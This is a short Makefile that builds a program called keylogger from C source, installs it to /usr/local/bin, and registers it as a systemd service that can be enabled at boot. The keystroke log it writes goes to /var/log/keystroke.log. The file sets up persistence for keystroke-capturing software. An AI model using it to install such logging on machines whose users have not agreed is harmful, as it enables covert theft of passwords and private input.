CC=gcc
CFLAGS=-fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 
LDFLAGS=-Wl,-z,relro,-z,now
SOURCES=keylogger.c
SERVICE=keylogger.service
EXECUTABLE=keylogger
INSTALLDIR=/usr/local/bin
SERVICEDIR=/etc/systemd/system/
DEPENDENCIES=define.h functions.h

install:$(SOURCES) $(DEPENDENCIES)
	@$(CC) $(SOURCES) $(CFLAGS) $(LDFLAGS) -o $(EXECUTABLE)
	@mv $(EXECUTABLE) $(INSTALLDIR)
	@cp $(SERVICE) $(SERVICEDIR)

uninstall:
	@rm $(SERVICEDIR)/$(SERVICE)
	@rm $(INSTALLDIR)/$(EXECUTABLE)

start:
	@systemctl start $(SERVICE)

stop:
	@systemctl stop $(SERVICE)

enable:
	@systemctl enable $(SERVICE)

disable:
	@systemctl disable $(SERVICE)

remove:
	@rm /var/log/keystroke.log
